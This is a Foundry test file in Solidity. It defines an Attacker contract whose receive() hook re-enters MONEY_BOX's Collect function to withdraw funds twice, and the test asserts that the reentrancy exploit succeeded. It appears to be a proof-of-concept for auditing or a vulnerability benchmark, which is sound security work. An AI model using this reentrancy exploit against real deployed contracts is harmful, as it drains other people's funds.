
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/MONEY_BOX.sol";

contract TestReentrancyMONEY_BOX is Test {

    MONEY_BOX public _contractUnderTest;
    Log public logFile;
    Attacker public _attacker;

    function setUp() public {
        logFile = new Log();
        _contractUnderTest = new MONEY_BOX();
        _contractUnderTest.SetMinSum(1);
        _contractUnderTest.SetLogFile(address(logFile));
        _contractUnderTest.Initialized();

        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 depositVal, uint256 withdrawVal) public {
        
        vm.assume(withdrawVal > 0 && withdrawVal < type(uint128).max);
        vm.assume(depositVal >= 2 * withdrawVal && depositVal < type(uint128).max);
        vm.assume(withdrawVal >= _contractUnderTest.MinSum());

        vm.deal(address(_contractUnderTest), withdrawVal * 2); 
        
        vm.deal(address(_attacker), depositVal * 2);

        vm.deal(address(this), depositVal * 2);

        vm.warp(block.timestamp + 1);

        _attacker.setupAttack{value: depositVal}(depositVal);
        _attacker.attack(withdrawVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    MONEY_BOX public _victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedWithdrawVal;

    constructor(address victimAddress) { 
        _victim = MONEY_BOX(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        _victim.Put{value: val}(0);
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;

        storedWithdrawVal = val;

        _victim.Collect(val);

        if (attackCallCount >= 2 && address(this).balance == initialSnapshot + 2 * val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            _victim.Collect(storedWithdrawVal);
            attackCallCount++;
        }
    }
}
